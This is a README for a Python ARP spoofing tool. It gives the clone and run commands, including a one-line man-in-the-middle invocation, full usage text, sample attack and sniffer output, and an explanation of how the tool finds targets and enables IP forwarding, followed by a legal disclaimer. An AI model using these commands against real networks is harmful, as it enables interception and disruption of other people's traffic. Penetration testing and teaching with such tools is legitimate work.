# Python 3 ARP Spoofing Tool

![Python Version](https://img.shields.io/badge/python-3.x-blue?style=for-the-badge&logo=python)
![OS](https://img.shields.io/badge/OS-GNU%2FLinux-red?style=for-the-badge&logo=linux)
[![CodeFactor Grade](https://img.shields.io/codefactor/grade/github/EONRaider/Arp-Spoofer?label=CodeFactor&logo=codefactor&style=for-the-badge)](https://www.codefactor.io/repository/github/eonraider/arp-spoofer)
[![License](https://img.shields.io/github/license/EONRaider/Packet-Sniffer?style=for-the-badge)](https://github.com/EONRaider/Packet-Sniffer/blob/master/LICENSE)

[![Reddit](https://img.shields.io/badge/Reddit-EONRaider-FF4500?style=flat-square&logo=reddit)](https://www.reddit.com/user/eonraider)
[![Discord](https://img.shields.io/badge/Discord-EONRaider-7289DA?style=flat-square&logo=discord)](https://discord.gg/KVjWBptv)
[![Twitter](https://img.shields.io/badge/Twitter-eon__raider-38A1F3?style=flat-square&logo=twitter)](https://twitter.com/intent/follow?screen_name=eon_raider)

A pure-Python ARP Cache Poisoning (a.k.a. "ARP Spoofing") tool that leverages
a low-level assembly of Ethernet II frames and ARP packets.

This application maintains no dependencies on third-party modules and can be 
run by any Python 3.x interpreter.

## Installation

Simply clone this repository with `git clone` and execute the `arpspoof.py` file 
as described in the following **Usage** section.

```
user@host:~/DIR$ git clone https://github.com/EONRaider/Arp-Spoofer.git
```

## Usage
```
arpspoof.py [-h] [-i INTERFACE] [--attackermac MAC] [--gatemac MAC]
            [--targetmac MAC] [--gateip IP] [--interval TIME] [-d | -f]
            TARGET_IP

Execute ARP Cache Poisoning attacks (a.k.a "ARP Spoofing") on local networks.

positional arguments:
  TARGET_IP                    IP address currently assigned to the target.

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Interface on the attacker machine to send packets
                        from.
  --attackermac MAC     MAC address of the NIC from which the attacker machine
                        will send the spoofed ARP packets.
  --gatemac MAC         MAC address of the NIC associated to the gateway.
  --targetmac MAC       MAC address of the NIC associated to the target.
  --gateip IP           IP address currently assigned to the gateway.
  --interval TIME       Time in between each transmission of spoofed ARP
                        packets (defaults to 0.5 seconds).
  --disassociate        Execute a disassociation attack in which a randomized
                        MAC address is set for the attacker machine,
                        effectively making the target host send packets to a
                        non-existent gateway.
  -f, --ipforward       Temporarily enable forwarding of IPv4 packets on the
                        attacker system until the next reboot. Set this to
                        intercept information between the target host and the
                        gateway, performing a man-in-the-middle attack.
                        Requires administrator privileges.
```


## Running the Application

#### METHOD I: "Too long, didn't read"
<table>
<tbody>
  <tr>
    <td>Objective</td>
    <td>Perform the attack with a single command and script-kid our way 
    to victory</td>
  </tr>
  <tr>
    <td>Execution</td>
    <td><b>sudo python3 arpspoof.py TARGET_IP -f</b></td>
  </tr>
</tbody>
</table>

#

#### METHOD II: Detailed Usage

<table>
<thead>
  <tr>
    <th colspan="2">Step 1 of 2</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>Objective</td>
    <td>Perform an <a href="https://en.wikipedia.org/wiki/ARP_spoofing" 
    target="_blank" rel="noopener noreferrer">ARP Cache Poisoning</a> with 
    <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack" 
    target="_blank" rel="noopener noreferrer">Man-in-the-middle (MITM)
    </a> attack against a target with IP address <b>10.0.1.6</b> on our 
    local network segment</td>
  </tr>
  <tr>
    <td>Execution</td>
    <td><b>sudo python3 arpspoof.py 10.0.1.6 -f</b></td>
  </tr>
  <tr>
    <td>Outcome</td>
    <td>Automatic configuration and subsequent transmission of spoofed ARP 
    packets until EOF signal (Ctrl-C). Refer to sample output below.</td>
  </tr>
  <tr>
    <td>Observations</td>
    <td>Notice how the remaining settings are automatically obtained, 
    including a setup for forwarding of IPv4 packets to enable a MITM 
    attack (set by the -f switch)</td>
  </tr>  
  </tbody>
</table>

- Sample Output

```
user@host:~$ sudo python3 arpspoof.py 10.0.1.6 -f
  
[>>>] ARP Spoofing configuration:
    [+] IPv4 Forwarding .....................True
    [+] Interface       .....................eth0
    [+] Attacker MAC    ........08:92:27:dc:3a:71
    [+] Gateway IP      .................10.0.1.1
    [+] Gateway MAC     ........52:93:d0:92:c5:06
    [+] Target IP       .................10.0.1.6
    [+] Target MAC      ........91:8b:28:93:af:07

[!] ARP packets ready. Execute the attack with these settings? (Y/N) y

[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.
```

<table>
<thead>
  <tr>
    <th colspan="2">Step 2 of 2</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>Objective</td>
    <td>Check the traffic generated by the attack and make sure it is actually working</td>
  </tr>
  <tr>
    <td>Execution</td>
    <td>Use an inspection tool such as <a href="https://github.com/EONRaider/Packet-Sniffer" target="_blank" rel="noopener noreferrer">Network Packet Sniffer</a></td>
  </tr>
  <tr>
    <td>Outcome</td>
    <td>Refer to sample output below</td>
  </tr>
  <tr>
    <td>Observations</td>
    <td>Check that packets #5 and #6 map the gateway and target IP addresses to the attacker MAC address (meaning that the attack was successful)</td>
  </tr>
</tbody>
</table>

- Sample Output

```
[>] Packet #1 at 14:10:12:
    [+] MAC ......08:92:27:dc:3a:71 -> ff:ff:ff:ff:ff:ff
    [+] ARP Who has      10.0.1.6 ? -> Tell 10.0.1.5
[>] Packet #2 at 14:10:12:
    [+] MAC ......91:8b:28:93:af:07 -> 08:92:27:dc:3a:71
    [+] ARP ...............10.0.1.6 -> Is at 91:8b:28:93:af:07
[>] Packet #3 at 14:10:12:
    [+] MAC ......08:92:27:dc:3a:71 -> 91:8b:28:93:af:07
    [+] IPv4 ..............10.0.1.5 -> 10.0.1.6        | PROTO: UDP TTL: 64
    [+] UDP ..................52949 -> 54663
[>] Packet #4 at 14:10:12:
    [+] MAC ......91:8b:28:93:af:07 -> 08:92:27:dc:3a:71
    [+] IPv4 ..............10.0.1.6 -> 10.0.1.5        | PROTO: ICMP TTL: 64
    [+] ICMP ..............10.0.1.6 -> 10.0.1.5        | Type: OTHER
[>] Packet #5 at 14:10:18:
    [+] MAC ......08:92:27:dc:3a:71 -> 52:54:00:12:35:00
    [+] ARP ...............10.0.1.6 -> Is at 08:92:27:dc:3a:71
[>] Packet #6 at 14:10:18:
    [+] MAC ......08:92:27:dc:3a:71 -> 91:8b:28:93:af:07
    [+] ARP ...............10.0.1.1 -> Is at 08:92:27:dc:3a:71
```

*And that's it! The attack will persist until otherwise aborted.*

#

### But how is this possible?

The simplest command for this tool consists of
`sudo python3 arpspoof.py TARGET_IP`

Then where do the remaining settings such as Target MAC, Gateway IP and
Attacker MAC come from? How is IPv4 forwarding enabled?

A brief explanation can be found in the docstring of the `ARPSetupProxy`
class in the
[packets.py](https://github.com/EONRaider/Arp-Spoofer/blob/master/packets.py)
file:

> Performs a best-effort attempt to query the system and network for
information necessary to build the ARP attack packets. **It allows the
user to initiate an attack by simply supplying the target's IP
address**. *All other required settings are looked up from the
attacker system's ARP and routing tables and by probing ephemeral
ports on the target host.*

This tool prioritizes the automated gathering of all information
required to initiate the attack, releasing the Penetration Tester from
going through all the manual processes required by similar tools.

With that in mind we have that **the following operations are the ones 
executed by the application to obtain each setting:**
- `IPv4 Forwarding`: Execute an overwriting of the value 0 to 1 in the
  file `/proc/sys/net/ipv4/ip_forward`.
- `Interface`: Parse the attacker's routing table and look for
interfaces mapping valid routes to the gateway.
- `Attacker MAC`: Bind to interface and query its name from `socket`
- `Gateway IP`: Parse the attacker's routing table and find the route
with `0x0003` flag set.
- `Gateway MAC`: Parse the attacker's ARP table looking for devices
with `Gateway IP`.
- `Target MAC`: Send a UDP datagram with an empty byte string to a
random ephemeral port on the target system (effectively making the
attacker system execute an ARP request followed by an ICMP probe
to the broadcast address) and then reading the newly written
information from the ARP table.

## Legal Disclaimer

The use of code contained in this repository, either in part or in its totality,
for engaging targets without prior mutual consent is illegal. **It is
the end-user's responsibility to obey all applicable local, state
and federal laws.**

Developers assume **no liability** and are not
responsible for misuses or damages caused by any code contained
in this repository in any event that, accidentally or otherwise, it comes to
be utilized by a threat agent or unauthorized entity as a means to compromise
the security, privacy, confidentiality, integrity and/or availability of
systems and their associated resources by leveraging the exploitation of known
or unknown vulnerabilities present in said systems, including, but not limited
to, the implementation of security controls, human- or electronically-enabled.

The use of this code is **only** endorsed by the developers in those
circumstances directly related to **educational environments** or
**authorized penetration testing engagements** whose declared purpose is that
of finding and mitigating vulnerabilities in systems, limiting their exposure
to compromises and exploits employed by malicious agents as defined in their
respective threat models.
